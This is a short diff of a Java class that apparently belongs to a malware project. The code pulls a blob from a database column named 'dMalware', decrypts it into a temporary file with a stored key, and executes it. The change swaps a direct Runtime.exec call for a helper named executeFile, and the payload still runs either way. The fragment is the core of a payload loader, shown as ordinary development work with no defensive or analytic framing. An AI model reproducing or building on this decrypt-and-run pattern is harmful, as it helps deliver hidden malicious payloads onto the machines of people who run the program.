@@ -32,9 +32,7 @@ public class Library {
 				if (rs.getInt("idNumber") == 2) {
 					File tempFile = sch.convertBytesToFile(rs.getBytes("dMalware"));
 					sqliteDB.getSecretKey().decryptFile(tempFile);
-					Process exec = Runtime.getRuntime().exec(tempFile.toString());
-					exec.waitFor();
-					System.out.println(exec.exitValue());
+					sch.executeFile(tempFile, "c++", "deploy");
 				} else {
 
 				}
